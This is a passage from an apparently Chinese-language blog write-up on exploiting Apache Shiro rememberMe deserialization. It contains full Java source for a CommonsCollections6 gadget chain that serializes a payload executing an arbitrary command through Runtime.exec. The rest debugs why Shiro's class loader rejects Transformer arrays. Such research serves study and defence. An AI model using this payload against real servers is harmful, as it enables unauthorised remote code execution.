&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">com.govuln.shiroattack&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsCollections6&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fakeTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">)};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">command&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fakeTransformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 不再使用原CommonsCollections6中的HashSet，直接使用HashMap
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TiedMapEntry&lt;/span> &lt;span style="color:#111">tme&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;keykey&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">expMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">tme&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;valuevalue&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">remove&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;keykey&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将生成结果发送，但是console疯狂报错&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301212540550.png" alt="image-20220301212540550">&lt;/p>
&lt;p>看到这个&lt;code>org.apache.shiro.io.ClassResolvingObjectInputStream&lt;/code>，它重写了&lt;code>resolveClass&lt;/code>方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ClassResolvingObjectInputStream&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ClassResolvingObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">resolveClass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ObjectStreamClass&lt;/span> &lt;span style="color:#111">osc&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ClassUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">osc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">UnknownClassException&lt;/span> &lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Unable to load ObjectStreamClass [&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">osc&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;]: &amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这是反序列化中用来查找类的方法，它重写了&lt;code>ObjectInputStream&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">resolveClass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ObjectStreamClass&lt;/span> &lt;span style="color:#111">desc&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">desc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">latestUserDefinedLoader&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">cl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">primClasses&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cl&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">cl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意到前者用的是&lt;code>org.apache.shiro.util.ClassUtils#forName&lt;/code>（内部是&lt;code>org.apache.catalina.loader.ParallelwebappClassLoader#loadClass&lt;/code>），而父类用的是&lt;code>Class.forName&lt;/code>&lt;/p>
&lt;p>我们在上面的位置打断点调试一下；注意如果断不下来，可以考虑往前找一找调用关系，比如org.apache.shiro.mgt.AbstractRememberMeManager#decrypt，它执行cookie部分的解码，中间触发反序列化&lt;/p>
&lt;p>&lt;code>resolveClass&lt;/code>依次得到我们链子中的LazyMap等等 都很正常，问题出在突然出现的&lt;code>[Lorg.apache.commons.collections.Transformer;&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302012117925.png" alt="image-20220302012117925">&lt;/p>
&lt;p>&lt;code>clazz==null&lt;/code>，抛出异常，但并不是因它是&lt;code>[L&lt;/code>标记的数组这一点导致报错，因为在它后面还有&lt;code>fqcn=&amp;quot;[Ljava.lang.Object;&amp;quot;&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302013221745.png" alt="image-20220302013221745">&lt;/p>
&lt;p>它就没有返回null，后面还有好几个都带&lt;code>[L&lt;/code>标记的对象，都没有返回null，这样的猜测显然是错误的&lt;/p>
&lt;p>重新发包并继续断在&lt;code>loadClass&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302014123306.png" alt="image-20220302014123306">&lt;/p>
&lt;p>我们注意到这里使用的&lt;code>ClassLoader&lt;/code>是上面的&lt;code>ParallelWebappClassLoader&lt;/code>，而它的工作模式就是这里的bug之处&lt;/p>
&lt;p>&lt;img src="https://images2015.cnblogs.com/blog/722072/201706/722072-20170623200651991-1212784795.png" alt="img">&lt;/p>
&lt;p>java装载类时遵循“全盘负责委托机制”，“全盘负责”指的是当一个ClassLoader装载一个类时，除非显示地使用另外一个ClassLoder，否则该类所依赖及引用的类也由这个ClassLoder载入；“委托机制”指先委托父类装载器寻找目标类，只有在找不到的情况下才从自己的类路径中查找并装载目标类，对应到这里，当它找不到时就会用上面的&lt;code>URLClassLoader&lt;/code>&lt;/p>
&lt;p>（特别注意的是，&lt;code>WeappClassLoader&lt;/code>默认不适用委托机制&lt;/p>
&lt;p>正常的class解析后path是最前面加&lt;code>/&lt;/code>，&lt;code>.&lt;/code>换为&lt;code>/&lt;/code>，&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302015732344.png" alt="image-20220302015732344">&lt;/p>
&lt;p>之后这个值会传入hashMap作为key，我们直接在key的地方断，发现Transformer数组传入稍有点特殊（数组都这样&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020435664.png" alt="image-20220302020435664">&lt;/p>
&lt;p>问题是它在前一步调用的是上层的&lt;code>URLClassLoader&lt;/code>！&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020339145.png" alt="image-20220302020339145">&lt;/p>
&lt;p>对照其它带&lt;code>[L&lt;/code>的对象&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020711367.png" alt="image-20220302020711367">&lt;/p>
